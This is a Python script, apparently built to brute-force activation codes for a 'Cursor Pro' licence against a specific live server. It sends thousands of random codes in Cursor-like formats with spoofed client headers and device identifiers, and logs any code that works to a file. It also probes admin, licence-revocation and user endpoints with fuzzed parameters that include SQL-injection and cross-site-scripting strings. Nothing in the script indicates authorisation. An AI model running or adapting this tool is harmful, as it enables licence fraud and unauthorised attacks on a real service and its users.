import requests
import random
import time
import json
import hashlib
import uuid
import platform
import string
import itertools
from concurrent.futures import ThreadPoolExecutor
from typing import Dict, List, Set
import logging
import sys
from requests.exceptions import RequestException, Timeout
import socket


class APITester:
    def __init__(self):
        self.base_url = "http://2000.run:3000"
        self.success_count = 0
        self.total_tests = 0
        self.found_apis = set()
        self.retry_count = 3
        self.activation_success = set()  # 存储成功的激活码
        self.tested_codes = set()  # 存储已测试的激活码

        # 配置日志
        logging.basicConfig(
            level=logging.INFO,
            format="%(asctime)s - %(levelname)s - %(message)s",
            handlers=[
                logging.FileHandler("api_test.log", encoding="utf-8"),
                logging.StreamHandler(sys.stdout),
            ],
        )

        # 激活相关的API端点
        self.activation_endpoints = [
            "/api/activate_member",
            "/api/license/activate",
            "/api/subscription/activate",
            "/api/device/verify",
            "/api/verify",
        ]

        # 其他端点
        self.other_endpoints = [
            "/api/check_member",
            "/api/refresh_account",
            "/api/license/generate-codes",
            "/api/auth",
            "/api/status",
            "/api/user/info",
            "/api/user/update",
            "/api/license/check",
            "/api/device/register",
            "/api/subscription/check",
            "/api/login",
            "/api/register",
            "/api/reset-password",
            "/api/logout",
            "/api/token/refresh",
            "/api/user/profile",
            "/api/user/settings",
            "/api/license/list",
            "/api/license/revoke",
            "/api/device/list",
            "/api/device/delete",
            "/api/subscription/plans",
            "/api/subscription/cancel",
            "/api/webhook",
            "/api/stats",
            "/api/health",
            "/admin/users",
            "/admin/licenses",
            "/admin/devices",
            "/admin/stats",
            "/graphql",
            "/api/graphql",
        ]

        self.known_endpoints = self.activation_endpoints + self.other_endpoints

        # 扩展请求头模板
        self.headers_templates = [
            {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
                "Accept": "application/json",
                "Content-Type": "application/json",
                "X-Request-ID": str(uuid.uuid4()),
            },
            {
                "User-Agent": "Cursor/1.0",
                "Accept": "application/json",
                "Content-Type": "application/json",
                "X-Device-ID": self.generate_device_id(),
            },
            {
                "User-Agent": "CursorPro/2.0",
                "Accept": "application/json",
                "Content-Type": "application/json",
                "X-Client-Version": "2.0.0",
                "X-Machine-ID": self.get_machine_code(),
            },
        ]

        # 参数变异测试值
        self.mutation_values = {
            "string": [
                "",
                "null",
                "undefined",
                "<script>alert(1)</script>",
                "' OR '1'='1",
                None,
                "true",
                "false",
                "0",
                "1",
                "admin",
                "administrator",
                "root",
            ],
            "number": [
                0,
                -1,
                9999999,
                "0",
                "",
                None,
                True,
                False,
                "null",
                2147483647,
                -2147483648,
            ],
            "boolean": [True, False, "true", "false", 0, 1, None, "", "null"],
            "object": [{}, None, "", "null", "undefined", [], "{}"],
            "array": [[], None, "", "null", "undefined", {}, "[]", [1, 2, 3]],
        }

    def get_mac_address(self):
        """获取 MAC 地址"""
        try:
            mac = ":".join(
                [
                    "{:02x}".format(uuid.getnode() >> elements & 255)
                    for elements in range(0, 48, 8)
                ][::-1]
            )
            return mac
        except:
            return "000000000000"

    def get_machine_code(self):
        """获取机器码"""
        try:
            system = platform.system()
            info = str(uuid.getnode())
            return hashlib.sha256(info.encode()).hexdigest()
        except:
            return hashlib.sha256(str(time.time()).encode()).hexdigest()

    def generate_device_id(self, mac=None, machine_code=None):
        """生成设备识别码"""
        if not mac:
            mac = self.get_mac_address()
        if not machine_code:
            machine_code = self.get_machine_code()

        clean_mac = mac.replace(":", "")
        combined = f"{clean_mac}_{machine_code}0"
        return hashlib.md5(combined.encode()).hexdigest()

    def generate_activation_code(self) -> str:
        """生成可能的激活码格式"""
        code_formats = [
            # 标准16位格式 XXXX-XXXX-XXXX-XXXX
            lambda: "-".join(
                "".join(random.choices(string.ascii_uppercase + string.digits, k=4))
                for _ in range(4)
            ),
            # 纯16位格式
            lambda: "".join(
                random.choices(string.ascii_uppercase + string.digits, k=16)
            ),
            # 12位格式
            lambda: "".join(
                random.choices(string.ascii_uppercase + string.digits, k=12)
            ),
            # 20位格式
            lambda: "".join(
                random.choices(string.ascii_uppercase + string.digits, k=20)
            ),
            # 带前缀的格式
            lambda: f"CURSOR-{''.join(random.choices(string.ascii_uppercase + string.digits, k=12))}",
            lambda: f"PRO-{''.join(random.choices(string.ascii_uppercase + string.digits, k=12))}",
            # 时间戳相关格式
            lambda: f"T{int(time.time())}-{''.join(random.choices(string.ascii_uppercase + string.digits, k=8))}",
            # 特殊格式
            lambda: f"{''.join(random.choices(string.ascii_uppercase, k=4))}-{''.join(random.choices(string.digits, k=6))}",
            # MD5前缀格式
            lambda: hashlib.md5(str(time.time()).encode()).hexdigest()[:16].upper(),
        ]

        while True:
            code = random.choice(code_formats)()
            if code not in self.tested_codes:
                self.tested_codes.add(code)
                return code

    def generate_sequential_code(self, pattern: str) -> str:
        """生成序列化的激活码"""
        chars = string.ascii_uppercase + string.digits
        replacements = {
            "X": lambda: random.choice(string.ascii_uppercase),
            "N": lambda: random.choice(string.digits),
            "A": lambda: random.choice(chars),
        }

        result = ""
        for char in pattern:
            if char in replacements:
                result += replacements[char]()
            else:
                result += char

        return result

    def generate_activation_payload(self, endpoint: str) -> Dict:
        """生成激活相关的payload"""
        device_id = self.generate_device_id()
        timestamp = int(time.time())
        machine_code = self.get_machine_code()

        base_payload = {
            "device_id": device_id,
            "timestamp": timestamp,
            "client_version": "2.0.0",
            "platform": platform.system().lower(),
            "arch": platform.machine(),
            "machine_code": machine_code,
            "mac_address": self.get_mac_address(),
        }

        # 不同的激活码格式
        activation_code = self.generate_activation_code()

        endpoint_specific = {
            "/api/activate_member": {
                "activation_code": activation_code,
                "product": "cursor_pro",
            },
            "/api/license/activate": {
                "license_key": activation_code,
                "product_id": "cursor_pro",
                "email": f"test_{random.randint(1000, 9999)}@example.com",
            },
            "/api/subscription/activate": {
                "subscription_key": activation_code,
                "plan_id": "pro_plan",
            },
            "/api/device/verify": {
                "verification_code": activation_code,
            },
            "/api/verify": {
                "code": activation_code,
                "type": "activation",
            },
        }

        payload = base_payload.copy()
        if endpoint in endpoint_specific:
            payload.update(endpoint_specific[endpoint])
        return payload

    def test_activation_endpoint(self, endpoint: str):
        """专门测试激活相关的端点"""
        full_url = f"{self.base_url}{endpoint}"

        # 测试不同的激活码格式
        patterns = [
            "XXXX-XXXX-XXXX-XXXX",  # 标准16位
            "XXXXXXXXXXXXXXXX",  # 纯16位
            "XXXX-NNNNNN",  # 字母+数字组合
            "AAAA-AAAA-AAAA-AAAA",  # 混合字符
            "PRO-XXXX-NNNN",  # 带前缀
        ]

        for pattern in patterns:
            for _ in range(50):  # 每个模式测试50次
                try:
                    payload = self.generate_activation_payload(endpoint)
                    self._make_request(full_url, payload, is_activation=True)
                    time.sleep(0.2)  # 控制请求速率
                except Exception as e:
                    logging.error(f"Activation test failed: {str(e)}")

    def test_endpoint(self, endpoint: str):
        """测试单个端点"""
        full_url = f"{self.base_url}{endpoint}"

        for attempt in range(self.retry_count):
            try:
                self._test_endpoint_with_mutations(full_url)
                break
            except Timeout:
                logging.warning(f"Timeout on attempt {attempt + 1} for {endpoint}")
                time.sleep(2**attempt)  # 指数退避
            except RequestException as e:
                logging.error(f"Request failed on attempt {attempt + 1}: {str(e)}")
                time.sleep(1)

    def _test_endpoint_with_mutations(self, url: str):
        """使用参数变异测试端点"""
        base_payload = self.generate_payload(url.split(self.base_url)[1])

        # 测试基础payload
        self._make_request(url, base_payload)

        # 参数变异测试
        for key in base_payload:
            value_type = type(base_payload[key]).__name__
            if value_type in self.mutation_values:
                for mutation in self.mutation_values[value_type]:
                    mutated_payload = base_payload.copy()
                    mutated_payload[key] = mutation
                    self._make_request(url, mutated_payload)

    def _make_request(self, url: str, payload: Dict, is_activation: bool = False):
        """发送请求并处理响应"""
        headers = random.choice(self.headers_templates).copy()
        headers["X-Timestamp"] = str(int(time.time()))
        headers["X-Request-ID"] = str(uuid.uuid4())

        try:
            logging.info(f"Testing: POST {url}")
            logging.debug(f"Headers: {headers}")
            logging.debug(f"Payload: {payload}")

            response = requests.post(
                url,
                json=payload,
                headers=headers,
                timeout=10,
                verify=False,
            )

            self.analyze_response(url, payload, response, is_activation)
            self.total_tests += 1

        except Exception as e:
            logging.error(f"Request failed: {str(e)}")
            raise

    def analyze_response(
        self,
        url: str,
        payload: Dict,
        response: requests.Response,
        is_activation: bool = False,
    ):
        """增强的响应分析"""
        try:
            response_text = response.text[:1000]
            status_code = response.status_code

            # 记录所有非404响应
            if status_code != 404:
                self._log_interesting_response(url, payload, response)

            if is_activation and status_code == 200:
                try:
                    data = response.json()
                    # 检查是否激活成功
                    success_indicators = [
                        data.get("code") == 0,
                        data.get("status") == "success",
                        data.get("success") is True,
                        "token" in data,
                        "access_token" in data,
                        "license" in data,
                        "subscription" in data,
                        "activated" in data,
                    ]

                    if any(success_indicators):
                        # 记录成功的激活码
                        activation_code = (
                            payload.get("activation_code")
                            or payload.get("license_key")
                            or payload.get("subscription_key")
                            or payload.get("verification_code")
                            or payload.get("code")
                        )
                        if activation_code:
                            self.activation_success.add(activation_code)
                            logging.warning(
                                f"Found working activation code: {activation_code}"
                            )
                            # 保存成功的激活码
                            with open(
                                "successful_activations.txt", "a", encoding="utf-8"
                            ) as f:
                                f.write(f"\n{'='*50}\n")
                                f.write(
                                    f"Timestamp: {time.strftime('%Y-%m-%d %H:%M:%S')}\n"
                                )
                                f.write(f"URL: {url}\n")
                                f.write(f"Activation Code: {activation_code}\n")
                                f.write(
                                    f"Payload: {json.dumps(payload, ensure_ascii=False, indent=2)}\n"
                                )
                                f.write(f"Response: {response_text}\n")
                except:
                    pass

            # 分析响应头
            interesting_headers = {
                k: v
                for k, v in response.headers.items()
                if k.lower()
                in {
                    "server",
                    "x-powered-by",
                    "set-cookie",
                    "www-authenticate",
                    "x-ratelimit-limit",
                    "x-ratelimit-remaining",
                }
            }
            if interesting_headers:
                logging.info(f"Interesting headers found: {interesting_headers}")

            # 检查是否是JSON响应
            try:
                data = response.json()
                self._analyze_json_response(url, data)
            except json.JSONDecodeError:
                # 检查是否包含敏感信息
                sensitive_patterns = [
                    "error:",
                    "exception",
                    "stack trace",
                    "syntax error",
                    "undefined",
                    "null",
                    "NaN",
                    "forbidden",
                    "unauthorized",
                    "internal server error",
                    "debug",
                    "warning",
                ]
                if any(
                    pattern in response_text.lower() for pattern in sensitive_patterns
                ):
                    logging.warning(
                        f"Possible sensitive information in response: {url}"
                    )

        except Exception as e:
            logging.error(f"Error analyzing response: {str(e)}")

    def _log_interesting_response(
        self, url: str, payload: Dict, response: requests.Response
    ):
        """记录有趣的响应"""
        with open("interesting_endpoints.txt", "a", encoding="utf-8") as f:
            f.write(f"\n{'='*50}\n")
            f.write(f"Timestamp: {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write(f"URL: {url}\n")
            f.write(f"Method: POST\n")
            f.write(f"Status Code: {response.status_code}\n")
            f.write(f"Headers: {dict(response.headers)}\n")
            f.write(f"Payload: {json.dumps(payload, ensure_ascii=False, indent=2)}\n")
            f.write(f"Response: {response.text[:1000]}\n")

    def _analyze_json_response(self, url: str, data: Dict):
        """分析JSON响应"""
        # 检查成功响应
        success_indicators = [
            data.get("code") == 0,
            data.get("status") == "success",
            data.get("success") is True,
            "token" in data,
            "access_token" in data,
            data.get("error") is None,
        ]

        if any(success_indicators):
            self.success_count += 1
            self.found_apis.add(url)
            self._save_api_structure(url, data)

    def _save_api_structure(self, url: str, data: Dict):
        """保存API结构到文件"""
        structure = {
            "url": url,
            "timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
            "method": "POST",
            "structure": self._get_deep_structure(data),
            "sample_response": data,
        }

        with open("api_structures.json", "a", encoding="utf-8") as f:
            json.dump(structure, f, ensure_ascii=False, indent=2)
            f.write("\n")

    def _get_deep_structure(self, data: any, depth: int = 0) -> Dict:
        """递归分析数据结构"""
        if depth > 5:  # 防止无限递归
            return {"type": "max_depth_reached"}

        if isinstance(data, dict):
            return {k: self._get_deep_structure(v, depth + 1) for k, v in data.items()}
        elif isinstance(data, list):
            return {
                "type": "array",
                "sample": (
                    self._get_deep_structure(data[0], depth + 1) if data else None
                ),
            }
        else:
            return {"type": type(data).__name__}

    def run(self):
        """运行增强版测试，优先测试激活相关端点"""
        logging.info(f"Starting enhanced tests against server: {self.base_url}")
        logging.info("=" * 50)

        # 首先测试激活相关的端点
        logging.info("Testing activation endpoints...")
        with ThreadPoolExecutor(max_workers=3) as executor:
            futures = []
            for endpoint in self.activation_endpoints:
                futures.append(executor.submit(self.test_activation_endpoint, endpoint))

            # 等待激活测试完成
            for future in futures:
                try:
                    future.result()
                except Exception as e:
                    logging.error(f"Activation test failed: {str(e)}")

        # 然后测试其他端点
        logging.info("Testing other endpoints...")
        with ThreadPoolExecutor(max_workers=2) as executor:
            for endpoint in self.other_endpoints:
                executor.submit(self.test_endpoint, endpoint)
                time.sleep(0.5)  # 控制请求速率

        self.print_results()

    def print_results(self):
        """打印详细测试结果"""
        print("\n" + "=" * 50)
        print("测试完成!")
        print(f"总请求次数: {self.total_tests}")
        print(f"发现可用接口数: {self.success_count}")
        print(f"命中率: {(self.success_count/self.total_tests)*100:.2f}%")

        if self.activation_success:
            print(f"\n发现可用的激活码数量: {len(self.activation_success)}")
            print("成功的激活码已保存到 successful_activations.txt")

        if self.found_apis:
            print("\n发现的可用接口:")
            for url in sorted(self.found_apis):
                print(f"POST: {url}")
            print("\n详细信息已保存到:")
            print("- interesting_endpoints.txt (详细请求和响应)")
            print("- api_structures.json (API结构和示例)")
            print("- api_test.log (完整测试日志)")
            print("- successful_activations.txt (成功的激活码)")


if __name__ == "__main__":
    tester = APITester()
    tester.run()
